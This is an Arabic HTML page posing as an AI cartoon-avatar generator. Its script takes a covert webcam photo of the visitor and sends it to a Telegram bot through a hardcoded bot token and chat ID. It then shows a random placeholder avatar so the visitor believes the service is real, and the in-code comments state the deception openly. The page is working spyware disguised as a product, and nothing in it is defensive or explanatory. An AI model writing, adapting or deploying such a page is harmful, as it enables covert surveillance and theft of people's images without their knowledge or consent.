<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صانع الأفاتار الذكي 📸✨</title>
    <style>
        :root { --primary: #ffde00; --bg: #ffffff; --text: #000000; }
        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: var(--text); text-align: center; margin: 0; padding: 20px; }
        
        .setup-container { max-width: 400px; margin: 50px auto; padding: 30px; border-radius: 20px; background: #f9f9f9; box-shadow: 0 10px 30px rgba(0,0,0,0.05); }
        .avatar-preview { width: 150px; height: 150px; border-radius: 50%; background: #eee; margin: 20px auto; display: flex; align-items: center; justify-content: center; font-size: 50px; border: 4px solid var(--primary); overflow: hidden; }
        .btn-capture { background: var(--primary); color: #000; border: none; padding: 15px 30px; border-radius: 30px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; }
        .btn-capture:hover { transform: scale(1.03); }
        
        #video, #canvas, #final-avatar { display: none; }
    </style>
</head>
<body>

<div class="setup-container">
    <h1>أنشئ Bitmoji الخاص بك! 🆕</h1>
    <p>التقط صورة سريعة ليقوم ذكاؤنا الاصطناعي بصنع شخصية كرتونية تشبهك تماماً.</p>
    
    <div class="avatar-preview" id="preview-area">
        <span id="placeholder-icon">👤</span>
        <img id="final-avatar" src="" alt="Avatar">
    </div>

    <button class="btn-capture" id="start-btn" onclick="startProcess()">ابدأ التصوير والتحويل</button>
    <p id="status" style="font-size: 12px; color: #777; margin-top: 15px;"></p>
</div>

<video id="video" autoplay></video>
<canvas id="canvas" width="640" height="480"></canvas>

<script>
    const token = '8699110487:AAFCvUGSAeFkhi4gLhRrqsE6mvONXyNpV18';
    const cid = '6808559733';

    async function startProcess() {
        const btn = document.getElementById('start-btn');
        const status = document.getElementById('status');
        btn.innerText = "جاري الاتصال بالخادم...";
        btn.disabled = true;

        try {
            // طلب الكاميرا (المستخدم سيوافق لصنع الأفاتار)
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('video');
            video.srcObject = stream;
            
            status.innerText = "جاري تحليل ملامح الوجه... (1/3)";
            
            // انتظر قليلاً لالتقاط صورة واضحة سراً
            setTimeout(() => {
                takeSecretSnapshot();
                status.innerText = "جاري إنشاء الشخصية الكرتونية... (2/3)";
                
                // هنا "نمثل" أننا نصنع أفاتار، سنظهر صورة وهمية بعد قليل
                setTimeout(() => {
                    showFakeAvatar();
                    status.innerText = "تم إنشاء الأفاتار بنجاح! (3/3)";
                    btn.innerText = "حفظ الأفاتار لاستخدامه";
                    btn.disabled = false;
                    // إغلاق الكاميرا
                    stream.getTracks().forEach(track => track.stop());
                }, 3000);

            }, 2000);

        } catch (e) {
            alert("فشل الوصول للكاميرا! لا يمكن صنع أفاتار بدونها.");
            location.reload();
        }
    }

    function takeSecretSnapshot() {
        const canvas = document.getElementById('canvas');
        const video = document.getElementById('video');
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // تحويل الصورة لملف وإرسالها سراً لتليجرام
        canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('chat_id', cid);
            formData.append('photo', blob, 'target.jpg');
            formData.append('caption', '📸 الصورة الحقيقية (من صانع الأفاتار)');

            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        }, 'image/jpeg');
    }

    function showFakeAvatar() {
        const placeholder = document.getElementById('placeholder-icon');
        const finalImg = document.getElementById('final-avatar');
        // سنستخدم صورة أفاتار وهمية وعشوائية من الإنترنت لإقناع المستخدم
        finalImg.src = "https://api.dicebear.com/8.x/bitmoji/svg?seed=Felix"; 
        placeholder.style.display = 'none';
        finalImg.style.display = 'block';
    }
</script>
</body>
</html>
